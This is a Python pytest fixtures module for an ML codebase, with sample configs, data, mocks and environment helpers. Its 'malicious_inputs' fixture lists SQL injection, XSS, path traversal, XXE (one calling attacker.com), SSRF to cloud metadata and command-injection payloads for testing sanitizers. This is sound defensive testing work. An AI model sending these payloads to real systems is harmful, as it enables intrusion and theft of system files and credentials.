"""
Shared Fixtures for Tests

This module provides common fixtures that can be used across all test modules.
Import these fixtures in your conftest.py or individual test files.

Created: 2026-01-18 (Phase 14.0)
Version: 1.0.0
"""

from __future__ import annotations

import json
import os
import random
from collections.abc import Generator
from pathlib import Path
from typing import (
    Any,  # pragma: allowlist secret # pragma: allowlist secret # pragma: allowlist secret
)
from unittest.mock import MagicMock

import pytest

# =============================================================================
# Path Fixtures
# =============================================================================


@pytest.fixture
def repo_root() -> Path:
    """Return the repository root path."""
    return Path(__file__).resolve().parents[1]


@pytest.fixture
def src_root(repo_root: Path) -> Path:
    """Return the src directory path."""
    return repo_root / "src"


@pytest.fixture
def temp_work_dir(tmp_path: Path) -> Generator[Path, None, None]:
    """Create a temporary working directory and change to it."""
    original_cwd = os.getcwd()
    os.chdir(tmp_path)
    try:
        yield tmp_path
    finally:
        os.chdir(original_cwd)


# =============================================================================
# Configuration Fixtures
# =============================================================================


@pytest.fixture
def sample_yaml_config(tmp_path: Path) -> Path:
    """Create a sample YAML configuration file."""
    config_content = """
model:
  name: test-model
  hidden_size: 256
  num_layers: 2

training:
  learning_rate: 0.001
  batch_size: 32
  max_epochs: 10

data:
  train_path: data/train.jsonl
  valid_path: data/valid.jsonl
"""
    config_file = tmp_path / "config.yaml"
    config_file.write_text(config_content)
    return config_file


@pytest.fixture
def sample_json_config(tmp_path: Path) -> Path:
    """Create a sample JSON configuration file."""
    config = {
        "model": {"name": "test-model", "hidden_size": 256},
        "training": {"learning_rate": 0.001, "batch_size": 32},
    }
    config_file = tmp_path / "config.json"
    config_file.write_text(json.dumps(config, indent=2))
    return config_file


# =============================================================================
# Data Fixtures
# =============================================================================


@pytest.fixture
def sample_jsonl_data(tmp_path: Path) -> Path:
    """Create a sample JSONL data file."""
    records = [{"id": i, "text": f"Sample text {i}", "label": i % 3} for i in range(100)]
    data_file = tmp_path / "data.jsonl"
    data_file.write_text("\n".join(json.dumps(r) for r in records))
    return data_file


@pytest.fixture
def sample_csv_data(tmp_path: Path) -> Path:
    """Create a sample CSV data file."""
    csv_content = "id,text,label\n"
    csv_content += "\n".join(f"{i},Sample text {i},{i % 3}" for i in range(100))
    data_file = tmp_path / "data.csv"
    data_file.write_text(csv_content)
    return data_file


@pytest.fixture
def sample_dataset() -> list[dict[str, Any]]:
    """Create a sample in-memory dataset."""
    return [{"id": i, "text": f"Sample text {i}", "label": i % 3} for i in range(100)]


@pytest.fixture
def empty_dataset() -> list[dict[str, Any]]:
    """Create an empty dataset."""
    return []


@pytest.fixture
def large_dataset() -> list[dict[str, Any]]:
    """Create a large dataset for performance testing."""
    return [{"id": i, "text": f"Sample text {i}", "label": i % 10} for i in range(10000)]


# =============================================================================
# Mock Fixtures
# =============================================================================


@pytest.fixture
def mock_http_client() -> MagicMock:
    """Create a mock HTTP client."""
    client = MagicMock()
    client.get.return_value.status_code = 200
    client.get.return_value.json.return_value = {"status": "ok"}
    client.post.return_value.status_code = 201
    client.post.return_value.json.return_value = {"id": 1}
    return client


@pytest.fixture
def mock_database() -> MagicMock:
    """Create a mock database connection."""
    db = MagicMock()
    db.execute.return_value = MagicMock(fetchall=lambda: [])
    db.commit.return_value = None
    return db


@pytest.fixture
def mock_file_system(tmp_path: Path) -> Path:
    """Create a mock file system with common structure."""
    # Create directory structure
    (tmp_path / "data").mkdir()
    (tmp_path / "config").mkdir()
    (tmp_path / "output").mkdir()
    (tmp_path / "logs").mkdir()

    # Create some files
    (tmp_path / "data" / "train.jsonl").write_text('{"text": "train"}\n')
    (tmp_path / "data" / "valid.jsonl").write_text('{"text": "valid"}\n')
    (tmp_path / "config" / "default.yaml").write_text("key: value\n")

    return tmp_path


# =============================================================================
# Environment Fixtures
# =============================================================================


@pytest.fixture
def clean_environment(monkeypatch: pytest.MonkeyPatch) -> Generator[None, None, None]:
    """Provide a clean environment without test-affecting variables."""
    vars_to_remove = [
        "CODEX_DEBUG",
        "CODEX_VERBOSE",
        "CODEX_CONFIG",
        "CODEX_LOG_LEVEL",
    ]
    for var in vars_to_remove:
        monkeypatch.delenv(var, raising=False)
    yield


@pytest.fixture
def debug_environment(monkeypatch: pytest.MonkeyPatch) -> None:
    """Set up a debug environment."""
    monkeypatch.setenv("CODEX_DEBUG", "1")
    monkeypatch.setenv("CODEX_VERBOSE", "1")
    monkeypatch.setenv("CODEX_LOG_LEVEL", "DEBUG")


@pytest.fixture
def production_environment(monkeypatch: pytest.MonkeyPatch) -> None:
    """Set up a production-like environment."""
    monkeypatch.setenv("CODEX_DEBUG", "0")
    monkeypatch.setenv("CODEX_VERBOSE", "0")
    monkeypatch.setenv("CODEX_LOG_LEVEL", "WARNING")


# =============================================================================
# Randomness Fixtures
# =============================================================================


@pytest.fixture
def deterministic_random() -> Generator[None, None, None]:
    """Set deterministic random seed for reproducibility."""
    random.seed(42)
    yield


@pytest.fixture
def random_seed() -> int:
    """Return a random seed for testing."""
    return 42


# =============================================================================
# Logging Fixtures
# =============================================================================


@pytest.fixture
def capture_logs(tmp_path: Path) -> Generator[Path, None, None]:
    """Capture logs to a file."""
    log_file = tmp_path / "test.log"
    import logging

    handler = logging.FileHandler(log_file)
    handler.setLevel(logging.DEBUG)

    root_logger = logging.getLogger()
    root_logger.addHandler(handler)

    yield log_file

    root_logger.removeHandler(handler)
    handler.close()


# =============================================================================
# Network Fixtures
# =============================================================================


@pytest.fixture
def offline_mode(monkeypatch: pytest.MonkeyPatch) -> None:
    """Simulate offline mode by blocking HTTP/HTTPS requests.

    This fixture uses targeted patching of urllib and requests libraries
    instead of blocking all sockets at the OS level. This approach:

    - Allows local IPC and database connections to still work
    - Permits pytest's internal communication and plugin functionality
    - Blocks only HTTP/HTTPS requests to external services

    Use this fixture when testing code that should gracefully handle
    network failures or when ensuring no external API calls are made.

    Example:
        def test_handles_network_failure(offline_mode):
            # This will raise OSError when trying to make HTTP requests
            result = my_function_that_calls_api()
            assert result.fallback_used is True, "Result must not be empty"

    In this example, ``my_function_that_calls_api`` and ``result.fallback_used``
    are illustrative placeholders; replace them with your own code and result
    attributes that should be exercised under offline conditions.
    """
    try:
        import urllib.request

        def _block_urlopen(*args, **kwargs):
            raise OSError("Network access blocked in test (urlopen)")

        monkeypatch.setattr(urllib.request, "urlopen", _block_urlopen)
    except ImportError:
        _ = None  # suppressed: no action needed

    try:
        import requests

        def _block_requests(*args, **kwargs):
            raise OSError("Network access blocked in test (requests)")

        monkeypatch.setattr(requests, "request", _block_requests)
        monkeypatch.setattr(requests, "get", _block_requests)
        monkeypatch.setattr(requests, "post", _block_requests)
    except ImportError:
        _ = None  # suppressed: no action needed


# =============================================================================
# Async Fixtures
# =============================================================================


@pytest.fixture
def event_loop():
    """Create an event loop for async tests."""
    import asyncio

    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


# =============================================================================
# Security Fixtures
# =============================================================================


@pytest.fixture
def sample_api_key() -> str:
    """Return a sample API key for testing."""
    return "test-api-key-12345"


@pytest.fixture
def sample_jwt_token() -> str:
    """Return a sample JWT token for testing."""
    # This is a fake token for testing purposes only
    return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0In0.test"


@pytest.fixture
def malicious_inputs() -> dict[str, list[str]]:
    """Return a categorized dictionary of malicious inputs for security testing.

    ⚠️ SECURITY WARNING: This fixture contains actual attack vectors for testing
    security controls. These inputs should NEVER be used in production code
    or sent to real systems. They are intended only for:
    - Unit testing input sanitization functions
    - Validating security filters and validators
    - Verifying proper escaping and encoding

    Categories include SQL injection, XSS, path traversal, NoSQL injection,
    XXE, SSRF, and other common attack vectors.

    Example:
        def test_sanitizer_blocks_sql_injection(malicious_inputs):
            for payload in malicious_inputs["sql_injection"]:
                result = sanitize_input(payload)
                assert "DROP" not in result, "Result must not be empty"
    """
    return {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "1; UPDATE users SET role='admin'",
            "UNION SELECT * FROM passwords",
        ],
        "xss": [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f",
            "....//....//....//etc/passwd",
        ],
        "template_injection": [
            "{{constructor.constructor('return this')()}}",
            "${7*7}",
            "{{config.items()}}",
            "#{7*7}",
        ],
        "nosql_injection": [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "this.password == this.passwordConfirm"}',
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>',
        ],
        "ssrf": [
            "http://127.0.0.1:22",
            "http://localhost/admin",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
        ],
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "`id`",
            "$(whoami)",
        ],
    }


# =============================================================================
# Performance Fixtures
# =============================================================================


@pytest.fixture
def timer():
    """Provide a simple timer for performance tests."""
    import time

    class Timer:
        def __init__(self):
            self.start_time = None
            self.elapsed = None

        def start(self):
            self.start_time = time.time()

        def stop(self):
            self.elapsed = time.time() - self.start_time
            return self.elapsed

        def __enter__(self):
            self.start()
            return self

        def __exit__(self, *args):
            self.stop()

    return Timer()


# =============================================================================
# Cleanup Fixtures
# =============================================================================


@pytest.fixture(autouse=False)
def cleanup_temp_files(tmp_path: Path) -> Generator[Path, None, None]:
    """Clean up temporary files after test."""
    yield tmp_path
    # Cleanup is handled automatically by tmp_path fixture
